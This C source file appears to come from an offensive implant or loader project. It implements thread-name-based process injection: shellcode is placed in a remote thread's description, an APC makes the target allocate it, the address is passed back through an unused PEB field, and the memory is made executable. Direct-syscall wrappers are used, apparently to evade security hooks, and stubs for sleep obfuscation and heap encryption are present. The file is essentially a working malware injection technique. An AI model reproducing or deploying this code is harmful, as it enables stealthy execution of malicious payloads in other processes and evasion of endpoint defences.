/*
*   Description: ThreadName alloc/writing & Heap encryption
*/

// TODO: Sleep obfuscation

#include <windows.h>
#include <unwin.h>

#include <stdio.h>

#include "../syscalls/syscalls.h"
#include "../debugging/debugging.h"
#include "memory.h"

#define UNSED_PEB_FIELD 0x340

extern Ade GlobalAde;

static NTSTATUS status;

NTSTATUS CustomSetThreadDescription(HANDLE hThread, BYTE* buf, SIZE_T bufSize) {
    AdeSinner      sinner;
    UNICODE_STRING bufString;

    //
    // Make a buffer full of 0x01 
    //
    BYTE* backet = calloc(bufSize + sizeof(WCHAR), 1);
    memset(backet, 0x01, bufSize);

    //
    // Init the Unicode string
    //
    RtlInitUnicodeString(&bufString, (PWCHAR)backet);

    //
    // Copy the original buffer into the UNICODE_STRING
    //
    memcpy(bufString.Buffer, buf, bufSize);

    //
    // Set the thread-name
    //
    CallAde(sinner, "NtSetInformationThread", status,
        hThread,
        ThreadNameInformation,
        &bufString,
        sizeof(UNICODE_STRING)
    );

    return status;
}

WINBOOL ThreadNameAlloc(
    HANDLE hProcess,
    PBYTE shellcode,
    size_t shellcodeSize,
    MEMORY_ALLOC* MemoryAllocOut 
) {
    AdeSinner                 sinner;
    ULONG_PTR                 pebField; // UNUSED PEB FIELD
    PPEB                      ptrPeb;
    PROCESS_BASIC_INFORMATION pbi;

    //
    // Get remote process information
    //
    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof( PROCESS_BASIC_INFORMATION ),
        NULL
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtQueryInformationProcess: 0x%lx", status);
        return FALSE;
    }

    //
    // Get remote PEB
    //
    ptrPeb   = pbi.PebBaseAddress;

    //
    // Set a unsed field for passing information
    //
    pebField = (ULONG_PTR) ptrPeb + UNSED_PEB_FIELD;

    //
    // Create new thread for the purpose of calling: `GetThreadDescription`
    //
    HANDLE hThread;

    CallAde(sinner, "NtCreateThreadEx", status, 
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (PUSER_THREAD_START_ROUTINE) ExitThread,
        NULL,
        CREATE_SUSPENDED,
        0,
        0,
        0,
        NULL
    );

    if (hThread == INVALID_HANDLE_VALUE) {
        DEBUG_ERROR("CreateRemoteThread: 0x%lx", GetLastError());
        return FALSE;
    }

    //
    // Set the shellcode into the thread-name 
    //
    status = CustomSetThreadDescription(
        hThread,
        shellcode,
        shellcodeSize
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("CustomSetThreadDescription: 0x%lx", status);
        return FALSE;
    }

    // 
    // Call `GetThreadDescription` and orbain the new allocation addr into the PEB field
    //
    CallAde(sinner, "NtQueueApcThread", status,
        hThread,
        (PPS_APC_ROUTINE) GetThreadDescription,
        (void*) NtCurrentThread,
        (void*) pebField,
        0
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtQueueApcThread: 0x%lx", status);
        return FALSE;
    }

    //
    // Execute the APC chain and wait
    //
    ResumeThread(hThread);
    WaitForSingleObject(hThread, INFINITE);

    //
    // Read the new allocation addr into PEB field
    //
    void* ptrShellcode = NULL;
    CallAde(sinner, "NtReadVirtualMemory", status,
        hProcess,
        (LPVOID) pebField,
        &ptrShellcode,
        sizeof(void*),
        NULL
    );

    if (ptrShellcode == NULL) {
        DEBUG_ERROR("ReadProcessMemory: 0x%lx", GetLastError());
        DEBUG_ERROR("REMOTE SHELLCODE: 0x%p", ptrShellcode);
        return FALSE;
    }

    //
    // Set to RWX
    //
    DWORD oldProtection   = 0x0;
    PVOID ptrShellcode_   = ptrShellcode;
    SIZE_T shellcodeSize_ = shellcodeSize;
    CallAde(sinner, "NtProtectVirtualMemory", status,
        hProcess,
        &ptrShellcode_,
        &shellcodeSize_,
        PAGE_EXECUTE_READWRITE,
        &oldProtection
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("VirtualProtectEx: 0x%lx", GetLastError());
        return FALSE;
    }

    MemoryAllocOut->executionAddr = ptrShellcode;
    
    return TRUE;
}

//
// Stack & Heap encryption 
//
VOID TimerPastaAlPestoEPomodoro(ULONG time) {


}
